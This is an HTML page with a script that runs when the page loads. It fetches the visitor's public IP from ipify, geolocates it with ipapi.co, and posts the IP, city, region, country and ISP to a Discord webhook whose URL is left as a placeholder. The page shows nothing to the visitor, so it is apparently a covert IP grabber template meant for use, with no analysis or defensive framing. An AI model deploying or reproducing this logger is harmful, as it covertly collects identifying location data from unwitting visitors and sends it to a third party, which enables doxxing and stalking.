<!DOCTYPE html>
<html>
<head>
  <title>User Data</title>
</head>
<body>
  <script>
    function displayUserData() {
      fetch("https://api.ipify.org/?format=json")
        .then((response) => response.json())
        .then((data) => {
          const ip = data.ip;
          getLocationAndISP(ip);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }

    function getLocationAndISP(ip) {
      const locationUrl = `https://ipapi.co/${ip}/json/`;

      fetch(locationUrl)
        .then((response) => response.json())
        .then((data) => {
          const location = `${data.city}, ${data.region}, ${data.country_name}`;
          const isp = data.org;
          sendUserDataWithLocationAndISP(ip, location, isp);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }

    function sendUserDataWithLocationAndISP(ip, location, isp) {
      const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with the actual webhook URL
      const message = `IP Address: ${ip}\nLocation: ${location}\nISP: ${isp}`;

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: message })
      })
        .then((response) => console.log("Webhook sent successfully"))
        .catch((error) => console.error("Error sending webhook:", error));
    }

    displayUserData();
  </script>
</body>
</html>
